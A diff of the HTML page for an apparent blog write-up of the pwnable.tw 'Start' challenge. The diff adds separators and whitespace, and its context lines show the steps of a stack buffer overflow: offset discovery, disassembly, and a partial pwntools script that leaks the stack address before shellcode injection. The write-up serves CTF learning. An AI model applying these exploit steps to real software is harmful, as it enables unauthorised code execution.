@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
 <meta name="description" content="This challenge is quite simple, it has no protection against the hacker. Just use buffer overflow to change the return address and you can leak stack address. You can then send your shellcode to get the flag.
-Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string &amp;ldquo;6Aa7&amp;rdquo;." />
+ Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string &amp;ldquo;6Aa7&amp;rdquo;." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -35,7 +35,7 @@ Finding the buffer size I used a tool Overflow Exploit Pattern Generator generat
 
 <meta itemprop="name" content="Start - Pwnable.tw">
 <meta itemprop="description" content="This challenge is quite simple, it has no protection against the hacker. Just use buffer overflow to change the return address and you can leak stack address. You can then send your shellcode to get the flag.
-Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string &ldquo;6Aa7&rdquo;.">
+ Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string &ldquo;6Aa7&rdquo;.">
 <meta itemprop="datePublished" content="2020-06-05T16:48:25&#43;02:00" />
 <meta itemprop="dateModified" content="2020-06-05T16:48:25&#43;02:00" />
 <meta itemprop="wordCount" content="536">
@@ -49,13 +49,13 @@ Finding the buffer size I used a tool Overflow Exploit Pattern Generator generat
 
 <meta name="twitter:title" content="Start - Pwnable.tw"/>
 <meta name="twitter:description" content="This challenge is quite simple, it has no protection against the hacker. Just use buffer overflow to change the return address and you can leak stack address. You can then send your shellcode to get the flag.
-Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string &ldquo;6Aa7&rdquo;."/>
+ Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string &ldquo;6Aa7&rdquo;."/>
 
 
 
     <meta property="og:title" content="Start - Pwnable.tw" />
 <meta property="og:description" content="This challenge is quite simple, it has no protection against the hacker. Just use buffer overflow to change the return address and you can leak stack address. You can then send your shellcode to get the flag.
-Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string &ldquo;6Aa7&rdquo;." />
+ Finding the buffer size I used a tool Overflow Exploit Pattern Generator generating a 50 character long string. Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string &ldquo;6Aa7&rdquo;." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://foxmaccloud.com/writeups/pwnabletw/start/" />
 <meta property="og:image" content="http://foxmaccloud.com/"/>
@@ -141,9 +141,11 @@ Finding the buffer size I used a tool Overflow Exploit Pattern Generator generat
                 <p>This challenge is quite simple, it has no protection against the hacker.
 Just use buffer overflow to change the return address and you can leak stack address.
 You can then send your shellcode to get the flag.</p>
+<hr>
 <h2 id="finding-the-buffer-size">Finding the buffer size</h2>
 <p>I used a tool <a href="https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html">Overflow Exploit Pattern Generator</a> generating a 50 character long string.
 Running the executable trough tools such as GDB Enhanced Features (GEF) and checking the contents of the EIP registry, we can see the string &ldquo;6Aa7&rdquo;. We now can check this string in the Overflow Exploit Pattern Generator and calculate out the buffer size. The buffer size is 20.</p>
+<hr>
 <h2 id="finding-the-stack-pointer">Finding the stack pointer</h2>
 <p>Disassembling the binary;</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048060</span>  push esp
@@ -174,6 +176,7 @@ Running the executable trough tools such as GDB Enhanced Features (GEF) and chec
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080480a1</span>  int <span style="color:#ae81ff">0x80</span>
 </code></pre></div><p>We want to return to <code>0x08048087</code> right before the code sets up for sys_write.
 This way we can leak the stack pointer.</p>
+<hr>
 <h2 id="start-making-our-payload">Start making our payload</h2>
 <p>Now that we know where to find the stack pointer, we start crafting our payload.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -198,6 +201,7 @@ p<span style="color:#f92672">.</span>send(payload)
 stackAddress <span style="color:#f92672">=</span> unpack(p<span style="color:#f92672">.</span>read()[:<span style="color:#ae81ff">4</span>])
 <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Leaked Address: &#34;</span> <span style="color:#f92672">+</span> hex(stackAddress))
 </code></pre></div><p>This will give us the stack pointer.</p>
+<hr>
 <h2 id="making-our-shellcode-and-getting-shell">Making our shellcode and getting shell</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">import</span> os
